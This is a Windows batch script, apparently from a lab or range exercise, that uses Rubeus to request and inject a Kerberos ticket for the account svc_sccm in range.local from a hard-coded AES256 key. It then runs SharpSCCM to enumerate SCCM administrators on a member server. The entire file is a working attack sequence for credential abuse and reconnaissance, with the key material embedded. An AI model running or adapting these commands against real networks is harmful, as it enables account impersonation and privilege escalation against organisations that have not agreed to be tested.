@echo off
chcp 437 >nul
cd /d C:\Tools\ADTools
echo === RUBEUS PTT ===
Rubeus.exe asktgt /user:svc_sccm /domain:range.local /aes256:54D4BFDC9CD3B8885E6EEE6AA2AC04058C80D57D13EA70708CF7ABECB1927012 /ptt > C:\Tools\cadre-attack\sccm-rubeus.txt 2>&1
type C:\Tools\cadre-attack\sccm-rubeus.txt | findstr /i "imported KRB-ERROR error"
echo === SHARPSCCM get admins ===
SharpSCCM.exe get admins -sms mbr02.range.local -sc CAD > C:\Tools\cadre-attack\sccm-admins.txt 2>&1
type C:\Tools\cadre-attack\sccm-admins.txt
echo === EXITCODE %errorlevel% ===
